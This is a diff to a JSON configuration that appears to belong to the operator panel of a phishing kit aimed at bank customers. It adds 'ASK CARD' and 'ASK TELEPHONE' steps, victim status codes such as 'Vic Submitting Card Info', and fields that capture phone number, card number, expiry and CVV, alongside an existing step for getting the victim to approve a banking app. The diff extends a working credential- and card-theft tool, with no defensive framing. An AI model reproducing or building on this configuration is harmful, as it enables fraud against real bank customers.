@@ -773,6 +773,14 @@
         "status": "10"
       },
       {
+        "name": "ASK CARD",
+        "status": "13"
+      },
+      {
+        "name": "ASK TELEPHONE",
+        "status": "11"
+      },
+      {
         "name": "FINISH",
         "status": "6"
       }
@@ -821,6 +829,22 @@
       {
         "status": 10,
         "meaning": "Vic Approving Netguard App (use another function if they don't accept)"
+      },
+      {
+        "status": 11,
+        "meaning": "Vic Submitting Telephone"
+      },
+      {
+        "status": 12,
+        "meaning": "Vic Waiting... Submitted Telephone"
+      },
+      {
+        "status": 13,
+        "meaning": "Vic Submitting Card Info"
+      },
+      {
+        "status": 14,
+        "meaning": "Vic Waiting... Submitted Card Info"
       }
     ],
     "information": [
@@ -843,6 +867,22 @@
       {
         "heading": "Netguard Key",
         "key": "netguardKey"
+      },
+      {
+        "heading": "Phone Number",
+        "key": "telephone"
+      },
+      {
+        "heading": "Card Number",
+        "key": "ccnum"
+      },
+      {
+        "heading": "Card Expiry",
+        "key": "ccexp"
+      },
+      {
+        "heading": "CVV",
+        "key": "cvv"
       }
     ],
     "mainInfo": [
